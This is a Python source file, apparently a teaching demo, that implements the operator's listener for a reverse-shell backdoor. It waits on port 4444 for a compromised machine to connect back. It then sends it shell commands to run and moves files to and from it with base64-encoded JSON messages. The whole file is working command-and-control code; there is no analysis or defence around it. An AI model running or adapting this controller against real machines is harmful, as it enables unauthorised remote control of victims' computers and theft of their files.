import socket, json, base64
#DEMO
class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))#(("192.168.0.102", 4444))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
#
    def reliable_send(self, data):################################################
        #if type(data) == bytes: #or type(data) != 'list':
        #data = data.decode('cp1252')
        #testshlapa
        #print("data:")
        #print(data)
        #for i in data:
            #print(i)
            #print(type(i))

        #base64
        #/testshlapa
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('cp1252'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('cp1252')
                return json.loads(json_data)
            except ValueError:
                continue

#

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):#download
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful "

    def read_file(selfselth, path):#upload
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            #try:#
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)
                print(command)

            #print(command)
            result = self.execute_remotely(command)
            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            #except Exception:#
                #result = "[-] Error duaring command execution "
            print(result)

my_listener = Listener("192.168.0.105", 4444)
my_listener.run()
